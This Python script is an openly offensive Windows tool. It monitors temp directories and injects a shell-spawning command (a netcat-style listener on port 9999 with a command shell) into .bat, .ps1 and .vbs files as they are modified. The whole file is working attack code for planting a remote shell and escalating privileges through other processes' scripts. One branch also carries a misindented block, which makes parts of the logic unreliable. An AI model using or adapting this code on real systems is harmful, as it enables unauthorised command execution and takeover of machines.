import os
import tempfile
import threading
import win32con
import win32file

# Action Code 
FILE_CREATED = 1
FILE_DELEATED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

exe = input("Enter the absolute path of your executable: ")
tg_ip = input("Enter the IP of the Windows target: ")
cmd = f'{exe} -t {tg_ip} -p 9999 -l -c'

# Code snippets: Marker and code to inject
FILE_TYPES = {
    '.bat': ["\r\nSassy\r\n", f'\r\n{cmd}\r\n'],
    '.ps1': ["\r\n#Sassy\r\n", f'\r\nStart-Process "{cmd}"\r\n'],
    '.vbs': ["\r\n'Sassy\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{cmd}")\r\n'],
}

def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents:
        return
    
    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('Injected code!')

FILE_LIST_DIRECTORY = 0X0001
# What do you wnat to monitor?
PATHS = ['C:\\Windows\\Temp', tempfile.gettempdir()]
#print(PATHS)

def monitor(path_to_watch):
    # Creates a handle to the directory to monitor
    h_directory = win32file.CreateFile(
        path_to_watch,                                          # Name of file/device to open/create
        FILE_LIST_DIRECTORY,                                    # Requested access to the file
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE |  # Requested sharing mode
        win32con.FILE_SHARE_DELETE,
        None,                                                   # Pointer to security attributes
        win32con.OPEN_EXISTING,                                 # Creation Disposition
        win32con.FILE_FLAG_BACKUP_SEMANTICS,                    # Flags and attributes (Necessary for the handle)
        None                                                    # Template File       
        )
    while True:
        try:
            # Subroutine returns a list of 2-tuples: action and filename
            results = win32file.ReadDirectoryChangesW(
                h_directory,                                    # Handle to directory
                1024,                                           # Buffer size for read results. You might need to adjust!
                True,                                           # Watches directory and its tree 
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |        # What to notify
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME | 
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE | 
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,                                           # For asynch operations
                None                                            # completition routine
            )
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                elif action == FILE_DELEATED:
                    print(f'[+] Deleted {full_filename}')
                elif action == FILE_MODIFIED:
                    extension = os.path.splitext(full_filename)[1]
                if extension in FILE_TYPES:
                    print(f'[+] Modified {full_filename}')
                    try:
                        print('[vvv] Dumping contents....')
                        with open(full_filename) as f:
                            contents = f.read()
                        inject_code(full_filename, contents, extension)
                        print(contents)
                        print('[^^^] Dump complete.')
                    except Exception as e:
                        print(f'[!!!] Dump failed. {e}')
                
                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknown action on {full_filename}')
        except Exception:
            pass

if __name__ == '__main__':
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path,))
        monitor_thread.start()
